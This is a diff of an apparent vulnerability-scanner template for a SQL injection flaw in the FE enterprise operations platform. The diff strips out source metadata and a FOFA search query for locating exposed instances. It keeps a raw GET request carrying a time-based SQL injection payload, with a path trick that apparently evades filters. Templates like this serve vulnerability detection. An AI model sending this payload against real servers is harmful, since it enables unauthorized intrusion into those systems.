@@ -3,12 +3,8 @@ info:
   name: 飞企互联-FE企业运营管理平台 efficientCodewidget39接口SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dhruxbm0zhrfhhbk'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dhruxbm0zhrfhhbk
-    fofa: app="飞企互联-FE企业运营管理平台"
 http:
 - raw:
   - 'GET /common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:5%27--+ HTTP/1.1
